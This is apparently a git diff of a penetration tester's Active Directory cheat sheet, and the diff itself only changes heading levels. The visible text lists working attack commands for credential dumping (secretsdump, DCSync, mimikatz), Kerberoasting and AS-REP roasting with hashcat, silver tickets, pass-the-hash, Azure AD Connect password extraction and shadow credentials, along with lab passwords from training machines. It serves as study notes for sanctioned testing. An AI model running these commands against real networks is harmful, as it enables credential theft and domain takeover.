@@ -312,22 +312,24 @@ Change resourcedc.resourced.local machin_ip_address in /etc/hosts
 
 impacket-psexec -k -no-pass resourcedc.resourced.local -dc-ip 192.168.x.x
 ```
-### Dump the local password hash and domain cached hash
+#### Dump the local password hash and domain cached hash
 ```
 Extract hashes from windows.old's sam and system file:
 
 impacket-secretsdump -sam SAM(local SAM file) -system SYSTEM(local SYSTEM file) local
 ```
-### Domain Controller Synchronization
+#### Domain Controller Synchronization
 >The DCSync permission implies having these permissions over the domain itself: DS-Replication-Get-Changes, Replicating Directory Changes All and Replicating Directory Changes In Filtered Set.
+
 >To perform this attack, we need a user that is a member of Domain Admins, Enterprise Admins, or Administrators, because there are certain rights required to start the replication. Alternatively, we can leverage a user with these rights assigned, though we're far less likely to encounter one of these in a real penetration test.
+
 ![image](https://github.com/user-attachments/assets/6fc92c9b-f6fc-49cc-a127-e8f41ba74ce2)
 ```
 lsadump::dcsync /user:<user>
 kali: impacket-secretsdump -just-dc corp.com/controlledUser:"BrouhahaTungPerorateBroom2023\!"@192.168.50.70
 ```
 
-### Abuse an NTLM user hash to gain a full Kerberos Ticket Granting Ticket(TGT) and gain rce
+#### Abuse an NTLM user hash to gain a full Kerberos Ticket Granting Ticket(TGT) and gain rce
 https://learn.microsoft.com/en-us/sysinternals/downloads/psexec
 ```
 sekurlsa::logonpasswords
@@ -336,7 +338,7 @@ net use \\dc01(logon server)
 klist
 .\PsExec.exe \\dc01 or \\DC01/Allison cmd.exe
 ```
-### AS-REP Roasting(Require Do not require Kerberos preauthentication enabled)
+#### AS-REP Roasting(Require Do not require Kerberos preauthentication enabled)
 ```
 Linux way:
 
@@ -350,7 +352,7 @@ Windows way:
 .\Rubeus.exe asreproast /nowrap
 hashcat -a 0 -m 18200 hashes.asreproast2 rockyou.txt -r /usr/share/hashcat/rules/best64.rule
 ```
-### Kerberoasting
+#### Kerberoasting
 >The goal of Kerberoasting is to harvest TGS tickets for services that run on behalf of user accounts in the AD, not computer accounts. Thus, part of these TGS tickets are encrypted with keys derived from user passwords. As a consequence, their credentials could be cracked offline. You can know that a user account is being used as a service because the property "ServicePrincipalName" is not null.
 
 >Therefore, to perform Kerberoasting, only a domain account that can request for TGSs is necessary, which is anyone since no special privileges are required.
@@ -376,7 +378,7 @@ Open a new terminal
 
 sudo ntpdate -s domain
 ```
-### Silver Tickets(Require SPN's hash, Domain's SID, SPN)
+#### Silver Tickets(Require SPN's hash, Domain's SID, SPN)
 >Service hash required 
 
 >Since silver and golden tickets represent powerful attack techniques, Microsoft created a security patch to update the PAC structure.5 With this patch in place, the extended PAC structure field PAC_REQUESTOR needs to be validated by a domain controller. This mitigates the capability to forge tickets for non-existent domain users if the client and the KDC are in the same domain. Without this patch, we could create silver tickets for domain users that do not exist. The updates from this patch are enforced from October 11, 2022.
@@ -414,7 +416,7 @@ Klist to view kerberos tickets
 #Always remember to sync the kdc time
 impacket-mssqlclient -k dc.sequel.htb
 ```
-### Pass The Hash/Pass The Key
+#### Pass The Hash/Pass The Key
 >In this attack, an attacker intercepts and steals a valid ticket-granting ticket (TGT) or service ticket (TGS) from a compromised user or service account.
 
 >The attacker then "passes" this stolen ticket to authenticate themselves as the compromised user or service without needing to know the account's password.
@@ -445,7 +447,7 @@ python wmiexec.py <domain_name>/<user_name>@<remote_hostname> -k -no-pass
 impacket-ticket_converter ticket.kirbi ticket.ccache
 impacket-ticket_converter ticket.ccache ticket.kirbi
 ```
-### Privilege Escalation via azure ad sync
+#### Privilege Escalation via azure ad sync
 ```
 Windows: sqlcmd -S MONTEVERDE -Q "use ADsync; select instance_id,keyset_id,entropy from mms_server_configuration"
 
@@ -453,7 +455,7 @@ evil-winrm -i 10.10.10.172 -u mhope -p "4n0therD4y@n0th3r$" -s .
 adconnect.ps1
 Get-ADConnectPassword
 ```
-### Shadow Credential Attack
+#### Shadow Credential Attack
 ```
 python3 pywhisker.py -d "certified.htb" -u "judith.mader" -p "judith09" --target "management_svc" --action "add"
 [*] Searching for the target account
